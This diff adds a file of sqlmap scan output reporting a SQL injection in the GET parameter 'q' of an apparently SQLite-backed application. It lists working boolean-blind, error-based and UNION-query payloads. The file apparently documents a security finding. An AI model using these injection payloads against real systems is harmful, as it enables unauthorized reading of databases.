@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
+---
+Parameter: q (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: q=alice' AND 3606=3606-- DRUb
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: q=alice' AND 3295=JSON_EXTRACT(CHAR(123,125),CHAR(113,112,98,107,113)||(SELECT (CASE WHEN (3295=3295) THEN 1 ELSE 0 END))||CHAR(113,122,106,112,113))-- GnCC
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: q=alice' UNION ALL SELECT CHAR(113,112,98,107,113)||CHAR(117,71,79,98,110,65,110,102,119,101,121,80,73,88,120,121,111,76,69,77,77,77,119,80,104,79,75,105,82,72,88,104,110,117,78,76,88,115,66,110)||CHAR(113,122,106,112,113),NULL,NULL-- nrcH
+---
+back-end DBMS: SQLite
